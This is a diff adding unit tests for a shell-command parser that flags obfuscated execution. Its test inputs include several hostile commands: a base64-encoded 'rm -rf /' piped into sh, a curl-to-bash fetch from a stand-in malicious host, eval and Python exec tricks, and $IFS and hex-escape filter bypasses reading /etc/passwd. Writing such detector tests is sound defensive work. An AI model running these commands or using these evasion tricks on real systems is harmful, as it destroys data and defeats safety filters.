@@ -117,4 +117,50 @@ describe('ShellAstParser', () => {
       expect(res.reasons).toEqual([]);
     });
   });
+
+  describe('isObfuscatedExecution', () => {
+    it('detects base64 decode piped into shell', () => {
+      const res = ShellAstParser.isObfuscatedExecution('echo "cm0gLXJmIC8=" | base64 -d | sh');
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('Decoded pipeline execution'))).toBe(true);
+    });
+
+    it('detects curl/wget piped directly into bash', () => {
+      const res = ShellAstParser.isObfuscatedExecution('curl -sSL https://malicious.site/script.sh | bash');
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('Remote script piped directly into shell'))).toBe(true);
+    });
+
+    it('detects dynamic eval with command substitutions', () => {
+      const res = ShellAstParser.isObfuscatedExecution('eval $(echo dangerous)');
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('Dynamic eval execution'))).toBe(true);
+    });
+
+    it('detects inline Python script with base64/exec', () => {
+      const res = ShellAstParser.isObfuscatedExecution('python3 -c "import base64; exec(base64.b64decode(\'cHJpbnQoMSk=\'))"');
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('Python inline script'))).toBe(true);
+    });
+
+    it('detects shell $IFS whitespace bypasses', () => {
+      const res = ShellAstParser.isObfuscatedExecution('cat${IFS}/etc/passwd');
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('$IFS'))).toBe(true);
+    });
+
+    it('detects ANSI-C hex/octal string escape execution', () => {
+      const res = ShellAstParser.isObfuscatedExecution("echo $'\\x72\\x6d' /tmp/file");
+      expect(res.isObfuscated).toBe(true);
+      expect(res.reasons.some(r => r.includes('ANSI-C hex/octal'))).toBe(true);
+    });
+
+    it('allows normal safe piped commands', () => {
+      const res1 = ShellAstParser.isObfuscatedExecution('ps aux | grep node | awk \'{print $2}\'');
+      expect(res1.isObfuscated).toBe(false);
+
+      const res2 = ShellAstParser.isObfuscatedExecution('cat file.txt | sort | uniq -c');
+      expect(res2.isObfuscated).toBe(false);
+    });
+  });
 });
